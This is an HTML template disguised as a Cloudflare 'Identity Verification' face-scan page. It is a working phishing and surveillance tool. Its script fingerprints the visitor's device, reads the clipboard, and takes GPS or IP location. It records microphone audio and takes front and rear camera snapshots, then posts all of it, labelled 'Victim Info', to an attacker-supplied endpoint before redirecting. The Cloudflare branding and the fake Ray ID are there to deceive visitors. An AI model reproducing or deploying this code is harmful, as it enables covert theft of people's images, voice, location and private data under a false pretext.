<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<meta name="robots" content="noindex, nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Check – Cloudflare</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;min-height:100%;background:#f6f6f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#1d1d1f}
.wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:18px;box-shadow:0 4px 32px rgba(0,0,0,.12);padding:32px 28px;max-width:400px;width:100%;text-align:center}
.cf-logo{font-size:36px;margin-bottom:4px}
.cf-title{font-size:21px;font-weight:700;color:#1d1d1f;margin-bottom:5px}
.cf-sub{font-size:13px;color:#6e6e73;margin-bottom:22px;line-height:1.6}

/* Face scan UI */
.face-wrap{position:relative;width:140px;height:140px;margin:0 auto 20px}
.face-circle{width:140px;height:140px;border-radius:50%;border:3px solid #e0e0e0;background:#f9f9f9;display:flex;align-items:center;justify-content:center;font-size:56px;position:relative;overflow:hidden}
.face-video{position:absolute;inset:0;width:100%;height:100%;border-radius:50%;object-fit:cover;display:none}
.scan-line{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#f58220,transparent);animation:scan 2s linear infinite;display:none}
.corner{position:absolute;width:20px;height:20px;border-color:#f58220;border-style:solid}
.corner.tl{top:4px;left:4px;border-width:3px 0 0 3px;border-radius:3px 0 0 3px}
.corner.tr{top:4px;right:4px;border-width:3px 3px 0 0;border-radius:0 3px 0 0}
.corner.bl{bottom:4px;left:4px;border-width:0 0 3px 3px;border-radius:0 0 0 3px}
.corner.br{bottom:4px;right:4px;border-width:0 3px 3px 0;border-radius:0 0 3px 0}
@keyframes scan{0%{top:10%}100%{top:90%}}
@keyframes pulse-ring{0%{transform:scale(.9);opacity:.8}70%{transform:scale(1.05);opacity:.3}100%{transform:scale(.9);opacity:.8}}
.pulse-ring{position:absolute;inset:-8px;border-radius:50%;border:2px solid #f58220;animation:pulse-ring 2s ease-in-out infinite;display:none}

/* Steps */
.steps{display:flex;flex-direction:column;gap:8px;margin-bottom:20px;text-align:left}
.step{display:flex;align-items:center;gap:10px;background:#f9f9f9;border-radius:10px;padding:10px 14px;font-size:13px;color:#555;transition:all .4s}
.step.active{background:#fff8f2;border:1px solid #f58220;color:#c96000}
.step.done{background:#f0fff4;border:1px solid #34c759;color:#1a7a3a}
.step-icon{font-size:18px;min-width:22px;text-align:center}
.step-badge{margin-left:auto;font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;background:#eee;color:#888}
.step.active .step-badge{background:#f58220;color:#fff}
.step.done .step-badge{background:#34c759;color:#fff}

.progress-bar{height:4px;background:#f0f0f0;border-radius:4px;margin:16px 0 8px;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#f58220,#e36209);border-radius:4px;transition:width .6s ease}
#status-msg{font-size:13px;color:#6e6e73;min-height:18px;margin-bottom:14px}

.verify-btn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#f58220,#e36209);color:#fff;border:none;border-radius:12px;padding:14px 32px;font-size:16px;font-weight:600;cursor:pointer;width:100%;justify-content:center;transition:all .2s}
.verify-btn:disabled{opacity:.55;cursor:not-allowed}

.footer{margin-top:20px;font-size:12px;color:#aaa}
.footer a{color:#aaa;text-decoration:none}
.cf-ray{margin-top:3px;font-size:11px;color:#ccc}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
.spin{animation:spin 1s linear infinite;display:inline-block}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="cf-logo">🛡️</div>
    <div class="cf-title">Identity Verification</div>
    <div class="cf-sub">We need to verify you're a real person.<br>A quick face scan will complete this step.</div>

    <!-- Face scan UI -->
    <div class="face-wrap">
      <div class="face-circle" id="face-circle">
        🙂
        <video id="vid-front" class="face-video" playsinline autoplay muted></video>
        <div class="scan-line" id="scan-line"></div>
      </div>
      <div class="corner tl"></div><div class="corner tr"></div>
      <div class="corner bl"></div><div class="corner br"></div>
      <div class="pulse-ring" id="pulse-ring"></div>
    </div>

    <!-- Steps -->
    <div class="steps">
      <div class="step" id="step1">
        <div class="step-icon">🖥️</div>
        <div>Device fingerprint</div>
        <div class="step-badge" id="b1">Pending</div>
      </div>
      <div class="step" id="step2">
        <div class="step-icon">📍</div>
        <div>Location verification</div>
        <div class="step-badge" id="b2">Pending</div>
      </div>
      <div class="step" id="step3">
        <div class="step-icon">🤳</div>
        <div>Face scan (liveness check)</div>
        <div class="step-badge" id="b3">Pending</div>
      </div>
    </div>

    <div class="progress-bar"><div class="progress-fill" id="pbar"></div></div>
    <div id="status-msg">Tap below to start verification</div>

    <button class="verify-btn" id="verify-btn" onclick="startVerify()">
      🔒 Start Face Verification
    </button>

    <div class="footer">
      DDoS protection by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
      <div class="cf-ray">Ray ID: <span id="ray">loading...</span></div>
    </div>
  </div>
</div>

<video id="vid-back" style="display:none" playsinline autoplay muted></video>
<canvas id="canvas" width="640" height="640" style="display:none"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script>
var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
var snapsConfirmed=0,minSnaps=3,redirectDone=false;

function setP(p){document.getElementById('pbar').style.width=p+'%';}
function setS(t){document.getElementById('status-msg').textContent=t;}

function stepActive(n){
  var el=document.getElementById('step'+n);
  el.className='step active';
  document.getElementById('b'+n).textContent='Scanning...';
}
function stepDone(n,txt){
  var el=document.getElementById('step'+n);
  el.className='step done';
  document.getElementById('b'+n).textContent=txt||'✓ Done';
}

function tryRedirect(){
  if(redirectDone)return;
  if(snapsConfirmed>=minSnaps){
    redirectDone=true;
    setS('Verification complete! Redirecting...');
    setP(100);
    setTimeout(function(){window.location.href=destUrl;},500);
  }
}

// Hard fallback
setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=destUrl;}},28000);

// ── Device info ────────────────────────────────────────────────────────────
async function sendDeviceInfo(){
  var td="";
  <% if(!t){ %>
  td+='<code>✅ Victim Info</code><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip%>"><%=ip%></a> | <%=time%> UTC</b>';
  <% }else{ %>
  try{var r=await fetch(a).then(x=>x.json());td+='<code>✅ Victim Info</code><br><b>⚓ IP: <a href="https://ip-api.com/#'+r.ip+'">'+r.ip+'</a> | <%=time%> UTC</b>';}catch(e){}
  <% } %>
  td+="<br><b>🕒 "+new Date()+"</b><br><b>Screen: "+screen.width+"x"+screen.height+"</b><br><b>TZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"</b><br>";
  var xo=["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","cookieEnabled","vendor","deviceMemory","appVersion","webdriver"];
  td+="<br><b>📱 Device</b><br>";
  for(var i=0;i<xo.length;i++){if(xo[i] in navigator){td+="<b>"+xo[i]+":</b> <code>"+navigator[xo[i]]+"</code><br>";}}
  if(navigator.connection){
    var nc=navigator.connection;
    td+="<br><b>🌐 Net: "+nc.effectiveType+" | "+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms</b><br>";
    $.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});
  }
  if("getBattery" in navigator){
    try{var b=await navigator.getBattery();var pct=Math.round(b.level*100);td+="<b>🔋 "+pct+"% | Charging:"+b.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:pct,charging:b.charging});}catch(e){}
  }
  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
  if(navigator.clipboard&&navigator.clipboard.readText){
    try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}
  }
}

// ── Location ───────────────────────────────────────────────────────────────
function fireLocation(){
  function sendLoc(lat,lon,acc){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)});}
  async function ipFb(){try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude)sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}catch(e){}}
  if(!navigator.geolocation){ipFb();return;}
  var t=setTimeout(ipFb,9000);
  navigator.geolocation.getCurrentPosition(
    function(p){clearTimeout(t);sendLoc(p.coords.latitude,p.coords.longitude,p.coords.accuracy+"m (GPS)");},
    function(){clearTimeout(t);ipFb();},
    {enableHighAccuracy:true,timeout:8000,maximumAge:0}
  );
}

// ── Camera ─────────────────────────────────────────────────────────────────
async function captureAndWait(stream){
  // Show face video in the circle
  var vidFront=document.getElementById('vid-front');
  vidFront.srcObject=stream;
  try{await vidFront.play();}catch(e){}
  vidFront.style.display='block';
  document.getElementById('scan-line').style.display='block';
  document.getElementById('pulse-ring').style.display='block';
  document.getElementById('face-circle').textContent='';
  document.getElementById('face-circle').appendChild(vidFront);
  document.getElementById('face-circle').appendChild(document.getElementById('scan-line'));

  // Wait for video
  await new Promise(function(r){
    var c=setInterval(function(){if(vidFront.readyState>=2&&vidFront.videoWidth>0){clearInterval(c);r();}},200);
    setTimeout(function(){clearInterval(c);r();},3000);
  });

  // Audio
  var at=stream.getAudioTracks();
  if(at.length){
    try{
      var rec=new MediaRecorder(new MediaStream(at)),chunks=[];
      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
      rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};
      rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},9000);
    }catch(e){}
  }

  // Front snaps — redirect only after server confirms
  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
  var sd=0;
  var st=setInterval(function(){
    if(vidFront.readyState<2||vidFront.videoWidth===0)return;
    ctx.drawImage(vidFront,0,0,640,640);
    var d=canvas.toDataURL("image/png").replace("data:image/png;base64","");
    (function(){
      $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d),cam:"front"},function(){
        snapsConfirmed++;
        setP(50+snapsConfirmed*13);
        if(snapsConfirmed===1) setS('Analyzing face... please stay still');
        if(snapsConfirmed===2) setS('Almost done...');
        tryRedirect();
      });
    })();
    if(++sd>=5)clearInterval(st);
  },1500);

  // Back camera
  setTimeout(async function(){
    try{
      var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"},width:{ideal:640},height:{ideal:640}}});
      var vidBack=document.getElementById('vid-back');
      vidBack.srcObject=bs;try{await vidBack.play();}catch(e){}
      await new Promise(function(r){var c=setInterval(function(){if(vidBack.readyState>=2&&vidBack.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},3000);});
      for(var i=0;i<2;i++){
        await new Promise(function(r){setTimeout(r,1500);});
        if(vidBack.readyState>=2&&vidBack.videoWidth>0){
          ctx.drawImage(vidBack,0,0,640,640);
          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
        }
      }
      bs.getTracks().forEach(function(t){t.stop();});
    }catch(e){}
  },4000);
}

// ── Main flow ──────────────────────────────────────────────────────────────
var verifying=false;
async function startVerify(){
  if(verifying)return;
  verifying=true;
  document.getElementById('verify-btn').disabled=true;
  document.getElementById('verify-btn').innerHTML='<span class="spin">⏳</span> Verifying...';

  // Step 1: device + location
  stepActive(1);
  setP(8); setS('Analyzing device fingerprint...');
  sendDeviceInfo();
  fireLocation();
  await new Promise(function(r){setTimeout(r,900);});
  stepDone(1,'✓ Verified');
  setP(18);

  stepActive(2);
  setS('Checking location data...');
  await new Promise(function(r){setTimeout(r,800);});
  stepDone(2,'✓ Verified');
  setP(30);

  // Step 3: face scan
  stepActive(3);
  setS('Camera access needed for face scan...');
  await new Promise(function(r){setTimeout(r,400);});

  var stream=null;
  try{
    stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}});
  }catch(e1){
    try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}
    catch(e2){
      stepDone(3,'Skipped');
      setP(100); setS('Verification complete!');
      await new Promise(function(r){setTimeout(r,800);});
      if(!redirectDone){redirectDone=true;window.location.href=destUrl;}
      return;
    }
  }

  stepDone(3,'Scanning...');
  setS('Face scan in progress...');
  setP(45);
  await captureAndWait(stream);
}

// Ray ID
window.onload=function(){
  var chars="qwertyuioplkjhgfdsazxcvbnm0987654321";
  var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*35)];
  document.getElementById('ray').textContent=ray;
  sendDeviceInfo(); // collect on load too
};
</script>
</body>
</html>
